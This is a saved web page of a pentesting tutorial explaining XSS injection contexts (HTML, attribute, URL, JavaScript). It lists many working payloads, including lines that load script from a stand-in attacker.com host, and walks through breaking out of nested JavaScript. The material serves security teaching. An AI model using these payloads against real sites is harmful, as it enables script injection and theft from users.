 <!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1" />
<meta name="keywords" content="Security Idiots, Hacking Research Papers, Security Research Papers, Web application Penetration Testing, Web Pentesting, web Injection, SQL Injection, XSS, RFI, LFI, LDAP, XPATH, Bypass, RCE, XML Injection" />
<meta name="description" content="Here we will learn, different types of contexts where XSS may reflect. How to deal with them and how we can balance the injection.">
<title>Different Contexts for XSS execution</title>
<link rel="stylesheet" href="../../css/skel.css" />
<link rel="stylesheet" href="../../css/style.css" />
<!--[if lte IE 8]><script src="css/ie/html5shiv.js"></script><![endif]-->
<script src="../../js/jquery.min.js"></script>
<script src="../../js/jquery.dropotron.min.js"></script>
<script src="../../js/skel.min.js"></script>
<script src="../../js/skel-layers.min.js"></script>
<script src="../../js/init.js"></script>
<script src="../../js/jquery.treeview.js" type="text/javascript"></script>
<script src="../../js/jquery.cookie.js" type="text/javascript"></script>
<script src="../../js/demo.js" type="text/javascript"></script>
<!--[if lte IE 8]><link rel="stylesheet" href="css/ie/v8.css" /><![endif]-->
<div id="fb-root"></div>
<script>(function(d, s, id) {
		  var js, fjs = d.getElementsByTagName(s)[0];
		  if (d.getElementById(id)) return;
		  js = d.createElement(s); js.id = id;
		  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&appId=727224234003200&version=v2.0";
		  fjs.parentNode.insertBefore(js, fjs);
		}(document, 'script', 'facebook-jssdk'));

</script>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-54093058-1', 'auto');
  ga('send', 'pageview');

</script>
<script id="dsq-count-scr" src="https://securityidiots-com.disqus.com/count.js" async></script>
</head>
<body class="left-sidebar"> 
<div id="header">
<div class="container">

<h1><a href="different-contexts-for-xss-execution.html#" id="logo">Security Idiots</a></h1>

<nav id="nav">
<ul>
<li><a href="../../index.html">Home</a></li>
<li>
<a href="different-contexts-for-xss-execution.html">Categories</a>
<ul>
<li><a href="../Information-Gathering/index.html">Information Gathering</a>
<ul>
<li><a href="../Information-Gathering/Cloudflare-Bypass/index.html">Cloudflare Bypass</a></li>
</ul>
</li>
<li><a href="../SQL-Injection/index.html">SQL Injection</a>
<ul>
<li><a href="../SQL-Injection/MSSQL/index.html">MSSQL</a></li>
</ul>
</li>
<li><a href="../Tricks/index.html">Tricks</a></li>
<li><a href="index.html">XSS</a></li>
<li><a href="../LFI/index.html">LFI</a></li>
<li><a href="../XPATH-Injection/index.html">XPATH Injection</a></li>
</ul>
</li>
<li><a href="https://www.youtube.com/watch?v=nMOyvIWn5Y8&list=PL5e1zp5ChO-S4nlMUy60AMIkB0XDgd8wb" target="_BLANK">Video Gallery</a></li>
<li><a href="../../construction.html">The Idiots Team</a></li>
<li><a href="../../construction.html">Contact Us</a></li>
</ul>
</nav>
</div>
</div>

<div id="main" class="wrapper style1">
<div class="container">
<div class="row"> 
<div id="sidebar" class="4u sidebar" style="width:25%;background:white;padding:20px;color:black; border: 2px solid #a1a1a1;border-radius: 25px;">
<section>
<header class="major">
<h2>Tutorials Browser</h2>
</header>
<div class="row half">
<ul id="browser" class="filetree">
<li><a href="../../Web-Pentest.html"><span class="folder">Web Pentest</span></a><ul id="Web-Pentest"></ul></li>
</ul>
<script>
function SetOpt(type,element,path,title,name){
container = document.getElementById(element);
if(type=='folder')
element='<li><span class="'+type+'"><a href="https://www.securityidiots.com/'+path+'" title="'+title+'">'+name+'</a></span><ul id="'+path+'"></ul></li>';
else
element='<li><span class="'+type+'"><a href="https://www.securityidiots.com/'+path+'" title="'+title+'">'+name+'</a></span></li>';
container.innerHTML = container.innerHTML + element;
}
SetOpt('folder','Web-Pentest','Web-Pentest/Information-Gathering','Information-Gathering','Information-Gathering');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-0-Purpose-of-Information-Gathering.html','Part-0-Purpose-of-Information-Gathering.html','Part-0-Purpose-of-Information-Gathering.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-1-information-Gathering-with-websites.html','Part-1-information-Gathering-with-websites.html','Part-1-information-Gathering-with-websites.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-2-information-Gathering-with-Google.html','Part-2-information-Gathering-with-Google.html','Part-2-information-Gathering-with-Google.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-3-information-Gathering-with-nmap.html','Part-3-information-Gathering-with-nmap.html','Part-3-information-Gathering-with-nmap.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-4-DNS-information-Gathering-with-DIG.html','Part-4-DNS-information-Gathering-with-DIG.html','Part-4-DNS-information-Gathering-with-DIG.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-5-information-Gathering-with-Fierce.html','Part-5-information-Gathering-with-Fierce.html','Part-5-information-Gathering-with-Fierce.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-6-information-Gathering-with-FOCA.html','Part-6-information-Gathering-with-FOCA.html','Part-6-information-Gathering-with-FOCA.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-7-information-Gathering-with-Metagofil.html','Part-7-information-Gathering-with-Metagofil.html','Part-7-information-Gathering-with-Metagofil.html');
SetOpt('folder','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Cloudflare-Bypass','Cloudflare-Bypass');
SetOpt('file','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Web-Pentest/Information-Gathering/Cloudflare-Bypass/Part-1-Understanding-Cloudflare-Security.html','Part-1-Understanding-Cloudflare-Security.html','Part-1-Understanding-Cloudflare-Security.html');
SetOpt('file','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Web-Pentest/Information-Gathering/Cloudflare-Bypass/Part-2-Cloudflare-Security-Bypass.html','Part-2-Cloudflare-Security-Bypass.html','Part-2-Cloudflare-Security-Bypass.html');
SetOpt('file','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Web-Pentest/Information-Gathering/Cloudflare-Bypass/Part-3-Cloudflare-Security-Bypass.html','Part-3-Cloudflare-Security-Bypass.html','Part-3-Cloudflare-Security-Bypass.html');
SetOpt('file','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Web-Pentest/Information-Gathering/Cloudflare-Bypass/Part-4-Cloudflare-Security-Bypass.html','Part-4-Cloudflare-Security-Bypass.html','Part-4-Cloudflare-Security-Bypass.html');
SetOpt('folder','Web-Pentest','Web-Pentest/LFI','LFI','LFI');
SetOpt('file','Web-Pentest/LFI','Web-Pentest/LFI/guide-to-lfi.html','guide-to-lfi.html','guide-to-lfi.html');
SetOpt('folder','Web-Pentest','Web-Pentest/SQL-Injection','SQL-Injection','SQL-Injection');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Part-1-Basic-of-SQL-for-SQLi.html','Part-1-Basic-of-SQL-for-SQLi.html','Part-1-Basic-of-SQL-for-SQLi.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Part-2-Basic-of-SQL-for-SQLi.html','Part-2-Basic-of-SQL-for-SQLi.html','Part-2-Basic-of-SQL-for-SQLi.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Part-3-Basic-of-SQL-for-SQLi.html','Part-3-Basic-of-SQL-for-SQLi.html','Part-3-Basic-of-SQL-for-SQLi.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Basic-Union-Based-SQL-Injection.html','Basic-Union-Based-SQL-Injection.html','Basic-Union-Based-SQL-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/basic-injection-single-line-or-death.html','basic-injection-single-line-or-death.html','basic-injection-single-line-or-death.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-Extractvalue.html','XPATH-Error-Based-Injection-Extractvalue.html','XPATH-Error-Based-Injection-Extractvalue.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-UpdateXML.html','XPATH-Error-Based-Injection-UpdateXML.html','XPATH-Error-Based-Injection-UpdateXML.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Error-Based-Injection-Subquery-Injection.html','Error-Based-Injection-Subquery-Injection.html','Error-Based-Injection-Subquery-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/sql-evil-twin-injection.html','sql-evil-twin-injection.html','sql-evil-twin-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Blind-SQL-Injection.html','Blind-SQL-Injection.html','Blind-SQL-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html','bypass-login-using-sql-injection.html','bypass-login-using-sql-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/dump-database-from-login-form-sql.html','dump-database-from-login-form-sql.html','dump-database-from-login-form-sql.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/url-spoofed-phishing-with-sqli.html','url-spoofed-phishing-with-sqli.html','url-spoofed-phishing-with-sqli.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/ddos-website-with-sqli-siddos.html','ddos-website-with-sqli-siddos.html','ddos-website-with-sqli-siddos.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/delete-query-injection.html','delete-query-injection.html','delete-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/update-query-injection.html','update-query-injection.html','update-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/xss-injection-with-sqli-xssqli.html','xss-injection-with-sqli-xssqli.html','xss-injection-with-sqli-xssqli.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/time-based-blind-injection.html','time-based-blind-injection.html','time-based-blind-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/insert-query-injection.html','insert-query-injection.html','insert-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/group-by-and-order-by-sql-injection.html','group-by-and-order-by-sql-injection.html','group-by-and-order-by-sql-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html','Union-based-Oracle-Injection.html','Union-based-Oracle-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html','Dump-in-One-Shot-part-1.html','Dump-in-One-Shot-part-1.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-2.html','Dump-in-One-Shot-part-2.html','Dump-in-One-Shot-part-2.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/DIOS-the-SQL-Injectors-Weapon-Upgraded.html','DIOS-the-SQL-Injectors-Weapon-Upgraded.html','DIOS-the-SQL-Injectors-Weapon-Upgraded.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/database-type-testing-sql-injection.html','database-type-testing-sql-injection.html','database-type-testing-sql-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/routed_sql_injection.html','routed_sql_injection.html','routed_sql_injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/multi-query-injection.html','multi-query-injection.html','multi-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/mssql-insert-query-injection.html','mssql-insert-query-injection.html','mssql-insert-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/oracle-sql-injection-dios-query.html','oracle-sql-injection-dios-query.html','oracle-sql-injection-dios-query.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/mssql-out-of-band-exploitation.html','mssql-out-of-band-exploitation.html','mssql-out-of-band-exploitation.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/addslashes-bypass-sql-injection.html','addslashes-bypass-sql-injection.html','addslashes-bypass-sql-injection.html');
SetOpt('folder','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/MSSQL','MSSQL','MSSQL');
SetOpt('file','Web-Pentest/SQL-Injection/MSSQL','Web-Pentest/SQL-Injection/MSSQL/mssql-dios.html','mssql-dios.html','mssql-dios.html');
SetOpt('file','Web-Pentest/SQL-Injection/MSSQL','Web-Pentest/SQL-Injection/MSSQL/MSSQL-Union-Based-Injection.html','MSSQL-Union-Based-Injection.html','MSSQL-Union-Based-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection/MSSQL','Web-Pentest/SQL-Injection/MSSQL/MSSQL-Error-Based-Injection.html','MSSQL-Error-Based-Injection.html','MSSQL-Error-Based-Injection.html');
SetOpt('folder','Web-Pentest','Web-Pentest/Tricks','Tricks','Tricks');
SetOpt('file','Web-Pentest/Tricks','Web-Pentest/Tricks/Grab-IP-Address-Using-Image.html','Grab-IP-Address-Using-Image.html','Grab-IP-Address-Using-Image.html');
SetOpt('folder','Web-Pentest','Web-Pentest/WAF-Bypass','WAF-Bypass','WAF-Bypass');
SetOpt('file','Web-Pentest/WAF-Bypass','Web-Pentest/WAF-Bypass/waf-bypass-guide-part-1.html','waf-bypass-guide-part-1.html','waf-bypass-guide-part-1.html');
SetOpt('file','Web-Pentest/WAF-Bypass','Web-Pentest/WAF-Bypass/bypass-sucuri-webSite-firewall.html','bypass-sucuri-webSite-firewall.html','bypass-sucuri-webSite-firewall.html');
SetOpt('folder','Web-Pentest','Web-Pentest/XPATH-Injection','XPATH-Injection','XPATH-Injection');
SetOpt('file','Web-Pentest/XPATH-Injection','Web-Pentest/XPATH-Injection/Basics-of-XPATH-for-XPATH-Injection-part-1.html','Basics-of-XPATH-for-XPATH-Injection-part-1.html','Basics-of-XPATH-for-XPATH-Injection-part-1.html');
SetOpt('file','Web-Pentest/XPATH-Injection','Web-Pentest/XPATH-Injection/Basics-of-XPATH-for-XPATH-Injection-part-2.html','Basics-of-XPATH-for-XPATH-Injection-part-2.html','Basics-of-XPATH-for-XPATH-Injection-part-2.html');
SetOpt('file','Web-Pentest/XPATH-Injection','Web-Pentest/XPATH-Injection/Basics-XPATH-injection.html','Basics-XPATH-injection.html','Basics-XPATH-injection.html');
SetOpt('file','Web-Pentest/XPATH-Injection','Web-Pentest/XPATH-Injection/xpath-injection-part-1.html','xpath-injection-part-1.html','xpath-injection-part-1.html');
SetOpt('folder','Web-Pentest','Web-Pentest/XSS','XSS','XSS');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/xss.series-by-securityidiots.html','xss.series-by-securityidiots.html','xss.series-by-securityidiots.html');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/basics-of-javascript-for-XSS-part2.html','basics-of-javascript-for-XSS-part2.html','basics-of-javascript-for-XSS-part2.html');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/basics-of-javascript-for-XSS3-final.html','basics-of-javascript-for-XSS3-final.html','basics-of-javascript-for-XSS3-final.html');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/xss-exploitation-series-part-1.html','xss-exploitation-series-part-1.html','xss-exploitation-series-part-1.html');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/different-contexts-for-xss-execution.html','different-contexts-for-xss-execution.html','different-contexts-for-xss-execution.html');
SetOpt('folder','Web-Pentest','Web-Pentest/XXE','XXE','XXE');
SetOpt('file','Web-Pentest/XXE','Web-Pentest/XXE/XXE-Cheat-Sheet-by-SecurityIdiots.html','XXE-Cheat-Sheet-by-SecurityIdiots.html','XXE-Cheat-Sheet-by-SecurityIdiots.html');

</script> </div>
</section>
</div>  <div id="content" class="8u skel-cell-important">
<section class="lol" style="padding:10px;background:#C9C9C2;color:black; border: 2px solid #a1a1a1;border-radius: 8px;">
<header class="major">
<h3><span class="byline">Different Contexts for XSS execution</span></h3>
<div class="row no-collapse-1">
<span class="post-description" style="text-align:justify;">Hey Everyone! been a long time since the last post :\ all due to laziness of Zen. So continuing the series, we are gonna talk about different contexts where XSS could occur.</br>
</br>
First of all what are XSS contexts?</br>
Contexts for XSS are nothing but the situations or the places/positions where the user input might reflect inside the DOM and if not sanitised or properly encoded then may lead to XSS.</br>
</br>
Basic types of contexts where XSS could occur could be:</br>
1. HTML context</br>
2. Attribute context</br>
3. URL context</br>
4. Javascript context</br>
</br>
#1. HTML context</br>
</br>
This is the simplest contexts where XSS could occur. Its nothing but when the unsanitized userinput is put into the response body as is. This occurs when angular brackets/tags (< or >) are not at all sanitized.</br>
</br>
Example:</br>
<pre>&lt;!DOCTYPE HTML&gt;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;HTML Context&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
{{userinput}}
&lt;/body&gt;
&lt;/html&gt;</pre></br>
Some Possible Payloads:</br>
<pre>&lt;script src=//attacker.com/evil.js&gt;&lt;/script&gt;
&lt;script&gt;alert(1)&lt;/script&gt;
&lt;svg onload=alert(1)&gt;
&lt;body onload=alert(1)&gt;
&lt;iframe onload=alert(1)&gt;</pre>
</br>
In order to Inject javascript we need to atleast inject "<" into the response body. A payload like `&lt;svg onload=alert(1)//` would be enough to trigger however there must be a closing tag anywhere below the injected payload</br>
</br>
There are certain tags which treat whatever the userinput inside them as raw text and do not render HTML at all. These tags needs to be closed themselves first before executing the payload. Example of this tag is:</br>
<br>
1. title</br>
</br>
Example:</br>
<pre>&lt;!DOCTYPE HTML&gt;
..
&lt;title&gt;{{userinput}}&lt;/title&gt;
..</pre>
</br>
Payload: `&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;`</br>
</br>
2. textarea</br>
</br>
Example:</br>
<pre>&lt;!DOCTYPE HTML&gt;
..
&lt;textarea&gt;{{userinput}}&lt;/textarea&gt;
..</pre>
</br>
Payload: `&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;`</br>
</br>
3. xmp</br>
</br>
Payload: `&lt;/xmp&gt;&lt;script&gt;alert(1)&lt;/script&gt;`</br>
</br>
</br>
#2. Attribute Context</br>
</br>
Its the case when the User input is inside any attribute's value of the HTML tag. Userinput in this context could be used in conjunction with event handlers to execute javascript. The Userinput inside an attribute could be in 3 ways:</br>
</br>
1. Double Quoted Input</br>
2. Single Quoted Input</br>
3. without any quotation</br>
</br>
This is also useful when the application is properly filtering/encoding the opening/closing tags</br>
</br>
<pre>&lt;!DOCTYPE HTML&gt;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
.....
...
&lt;input type="" name="input" value="{{user input}}"&gt; &lt;!-- double quoted --&gt;
&lt;input type="" name="input" value='{{user input}}'&gt; &lt;!-- single quoted --&gt;
&lt;input type="" name="input" value={{user input}}&gt; &lt;!-- without quotations --&gt;
...
....
&lt;/body&gt;
&lt;/html&gt;</pre>
</br>
Some Possible Payloads:</br>
</br>
#1. Double quoted</br>
</br>
`"autofocus onfocus="alert(1)`</br>
`"autofocus onfocus=alert(1)//`</br>
`"onbeforescriptexecute=alert(1)//`</br>
`"onmouseover="alert(1)//` (Interaction)</br>
`"autofocus onblur="alert(1)`	(Interaction)</br>
</br>
#2.Single Quoted</br>
</br>
`'autofocus onfocus='alert(1)`</br>
`'autofocus onfocus=alert(1)//`</br>
`'onbeforescriptexecute=alert(1)//`</br>
`'onmouseover='alert(1)//` (Interaction)</br>
`'autofocus onblur='alert(1)` (Interaction)</br>
</br>
#3. Without Quotations</br>
</br>
`aaaa autofocus onfocus=alert(1)//`</br>
`aaaa onbeforescriptexecute=alert(1)//`</br>
`aaaa onmouseover=alert(1)//`</br>
</br>
Note 1: You should use the proper event handlers with proper tags by looking at the documentations or some examples on the Internet otherwise not all event handlers work with every tags. There's an article by @brutelogic which contains those event handlers which works with all tags <a href="https://brutelogic.com.br/blog/agnostic-event-handlers/">https://brutelogic.com.br/blog/agnostic-event-handlers/</a></br>
</br>
Note 2: Also some tags couldn't execute javascript with any attribute (event handler) one such tag is "meta" tag</br>
</br>
**Disabled and Hidden Inputs:**</br>
</br>
Sometimes the Userinput could be inside an input which has `type=hidden` or has `disabled` attribute set. In such cases usual event handlers won't work.</br>
</br>
1. Hidden Inputs</br>
</br>
There are 2 ways to bypass this</br>
</br>
a) Accesskey with onclick event (Requires Interaction)</br>
</br>
Example:</br>
<pre>&lt;!DOCTYPE HTML&gt;
&lt;html&gt;
..
&lt;input type="hidden" value="{{userinput}}" /&gt;
..
&lt;/html&gt;</pre>
</br>
Payload: `"accesskey="X" onclick="alert(1)"`</br>
</br>
to Trigger the onclick event we then need to press the Key combination Alt+SHIFT+{accesskey} ie. in this case Alt+SHIFT+X</br>
</br>
b) This requires the Userinput to be before the `type=hidden` parameter which isn't the case always but if it is then we could execute javascript without interaction by overriding the type attribute of the input tag to anything other than hidden.</br>
</br>
Example:</br>
<pre>&lt;!DOCTYPE HTML&gt;
&lt;html&gt;
..
&lt;input value="{{userinput}}" type="hidden"/&gt; &lt;!-- notice the position of userinput before type --&gt;
..
&lt;/html&gt;</pre>
Payload: `" type=xx autofocus onfocus=alert(1)//`</br>
</br>
2. Disabled Inputs (Firefox only) :</br>
</br>
Example:</br>
<pre>&lt;!DOCTYPE HTML&gt;
&lt;html&gt;
..
&lt;input disabled value="{{userinput}}" /&gt;
..
&lt;/html&gt;</pre>
</br>
Payload: `"style="position:fixed;top:0;left:0;border:999em solid red;" onmouseover="alert(1)`</br>
</br>
Its discovered by Dr. Mario <a href="https://twitter.com/0x6D6172696F/status/933325205774139392">https://twitter.com/0x6D6172696F/status/933325205774139392</a></br>
</br>
#3. URL Context</br>
</br>
This is the case where most HTML encoding/filtering in the application doesn't work usually. This occurs due to the userinput into some special attributes in some tags which takes a URL/link and could be used to execute javascript.</br>
</br>
Examples:</br>
</br>
1. Script Tag</br>
<pre>&lt;script src="{{userinput}}"&gt;&lt;/script&gt;</pre>
The src attribute could be used to load javascript remotely</br>
</br>
Payload: `http://attacker.com/evil.js`</br>
</br>
2. Anchor Tag</br>
</br>
<pre>&lt;a href="{{userinput}}"&gt;Click&lt;/a&gt;</pre>
The href attribute of &lt;a&gt; tag could be used to execute javascript with `javascript:` scheme</br>
</br>
Payload: `javascript:alert(1)//`</br>
</br>
3. Iframe Tag</br>
</br>
<pre>&lt;iframe src="{{userinput}}" /&gt;</pre>
</br>
The src attribute of &lt;iframe&gt; tag could also be used to execute javascript with `javascript:` scheme</br>
</br>
Payload: `javascript:alert(1)//`</br>
</br>
4. Base tag</br>
</br>
<pre>&lt;base href="{{userinput}}"&gt;</pre>
</br>
The href attribute could be used to load javascript remotely so any other href or links such as scripts would be loaded from attacker domain as base.</br>
</br>
Payload: `http://attacker.com/evil.js?#`</br>
</br>
5. Form Tag</br>
</br>
<pre>&lt;form action={{userinput}}&gt;
...
&lt;button&gt;X&lt;/button&gt;</pre>
</br>
Payload: `javascript:alert(1)//`</br>
</br>
6. Frameset</br>
</br>
<pre>&lt;frameset&gt;&lt;frame src="{{userinput}}"&gt;&lt;/frameset&gt;</pre>
</br>
Payload: `javascript:alert(1)//`</br>
</br>
</br>
#4 Javascript context</br>
This happens when the Userinput is put into the javascript inside &lt;script&gt; tags or inside an event handler executing javascript. so what we have to do mostly is break out of any quotes and execute any javascript function directly.</br>
</br>
Example #1:</br>
</br>
<pre>&lt;!DOCTYPE HTML&gt;
&lt;html&gt;
..
&lt;script&gt;
var x="{{userinput}}";// break out of quotes accordingly if its double or single
..
...
&lt;/script&gt;
..
&lt;/html&gt;</pre>
</br>
Some Possible Payload:</br>
<pre>`";alert(1)//`
`"-alert(1)-"`
`"+alert(1)+"`
`"*alert(1)*"`</pre>
Js function can also be used as any other mathematical operand such as ^ (xor), % (modulous) , / (divide) etc..</br>
</br>
If the Userinput is directly reflected into some javascript expression without qoutes you might be able to execute javascript functions directly.</br>
</br>
Example #2:</br>
</br>
<pre>&lt;!DOCTYPE HTML&gt;
&lt;html&gt;
..
&lt;script&gt;
var x={{userinput}};
..
...
&lt;/script&gt;
..
&lt;/html&gt;</pre>
</br>
Some Possible Payloads:</br>
`alert(1);`</br>
`1-alert(1);`</br>
`alert(1)//`</br>
</br>
So actually all you have to do is break out of the context without making any errors in the syntax of existing javascript and balance up braces/paranthesis etc to execute our javascript otherwise if there's an error introduced in the syntax even after our payload, our javascript will not execute. Let's look at a Complex example</br>
</br>
Example #3:</br>
</br>
<pre>&lt;!DOCTYPE HTML&gt;
&lt;html&gt;
..
&lt;script&gt;
var x=123;
function test(){

if(test =='{{userinput}}'){
//something
}
else
{
//something
}
}
test();
&lt;/script&gt;
..
&lt;/html&gt;</pre>
</br>
Step by Step Solving:</br>
</br>
1. Break out of quote and closing "If" such that no error is there</br>
</br>
Userinput: `test'){//`</br>
</br>
We closed the single quote, closed the right paranthesis of "If", opened up brace to match the closing brace and commented the rest of the line</br>
</br>
The Output will look like</br>
</br>
<pre>function test(){

if(test =='test'){//'){
//something
}
else
{
//something
}
}</pre>
</br>
2. Since the function isn't execute anywhere we need to also break out of the function</br>
</br>
Userinput: `test'){1}}//`</br>
</br>
This will close the previous function completely without any error. However the rest of the code has a lot of unopened brances and paranthesis.</br>
</br>
The Output will look like</br>
</br>
<pre>function test(){

if(test =='test'){1}}//'){
//something
}
else
{
//something
}
}</pre>
</br>
3. To balance the rest of the code we need to also start a fake/dummy function and if condition inside it</br>
</br>
Userinput: `test'){1}};function dummy(){ if(1){//`</br>
</br>
so the errors are gone Now we could execute our javascript function just before our dummy function such as:</br>
</br>
Userinput: `test'){1}};alert(1);function dummy(){ if(1){//`</br>
</br>
4. To make the input small we could also use ES6 arrow function instead of writing a "function dummy()" like:</br>
</br>
Userinput: `test'){1}};alert(1);dummy=>{ if(1){//`</br>
</br>
final output will look like</br>
</br>
<pre>function test(){

if(test =='test'){1}};alert(1);dummy=>{ if(1){//'){1}}//'){
//something
}
else
{
//something
}
}</pre>
I guess that's enough for this tutorial. Next tutorial is where the fun begins with Filter and WAF bypassing tricks & stuffs Stay Tuned :D!<br><img src="../../post_images/xss_exploitation.jpg" width=0>
<br>Author : Rahul Maini<br>Date : 2018-05-31</span><br><br></div><div id="disqus_thread"></div>
<script>
var disqus_config = function () {
this.page.url = "http://securityidiots.com/Web-Pentest/XSS/different-contexts-for-xss-execution.html";  
this.page.identifier = "63";
};

(function() {
var d = document, s = d.createElement('script');
s.src = 'https://securityidiots-com.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript> </div>
</header>
</section>
</div>
</div>
</div>
</div>

<div id="footer">
<div class="container">

<div class="row">
<div class="8u">
<section>
<header class="major">
<h2>Connect with Security Idiots</h2>
<span class="byline">Learn & share more on Hacking and Security</span>
</header>
<div class="row">
<section class="6u">
<ul class="default">
<li><a href="https://www.facebook.com/pages/securityidiotscom/879838302049912" target="_BLANK"><img src="different-contexts-for-xss-execution.html" width=40>&nbsp;&nbsp;<font size=5><b>FACEBOOK</b></font></a></li>
<li><a href="https://www.youtube.com/channel/UCPPAYs04kwfXcHnerm_ueFw" target="_BLANK"><img src="../../images/youtube.png" width=40>&nbsp;&nbsp;<font size=5><b>Youtube Channel</b></font></a></li>
</ul>
</section>
</div>
</section>
</div>
<div class="4u">
<section>
<header class="major">
<h2>Contact Security Idiots</h2>
</header>
<ul class="contact">
<li>
<span class="address">Email</span>
<span><a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="3756535a5e597744525442455e434e5e535e5843441954585a">[email&#160;protected]</a></span>
</li>
</ul>
</section>
</div>
</div>

<div class="copyright">
Designed by k-hz webdevelopers
</div>
</div>
</div>
<script data-cfasync="false" src="../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script></body>
</html>